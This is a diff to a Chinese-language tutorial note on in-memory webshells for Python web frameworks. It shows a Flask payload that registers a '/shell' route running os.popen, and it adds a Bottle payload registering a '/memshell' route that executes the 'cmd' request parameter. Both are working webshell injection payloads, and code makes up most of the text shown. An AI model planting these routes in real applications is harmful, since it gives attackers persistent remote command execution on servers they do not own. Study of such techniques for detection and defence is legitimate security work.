@@ -14,7 +14,7 @@ python内存马的基本原理就是我们自定义一个路由，路由里面�
 
 payload：
 
-```Python
+```python
 sys.modules['__main__'].__dict__['app'].add_url_rule('/shell','shell',lambda :__import__('os').popen('dir').read())
 ```
 
@@ -61,3 +61,6 @@ https://www.cnblogs.com/gxngxngxn/p/18181936
 新版会使用after_request 和 before_request的底层函数，设置请求前要做的动作
 
 # bottle框架内存马
+```python
+app.route("/memshell","GET",lambda :__import__('os').popen(request.params.get('cmd')).read)
+```
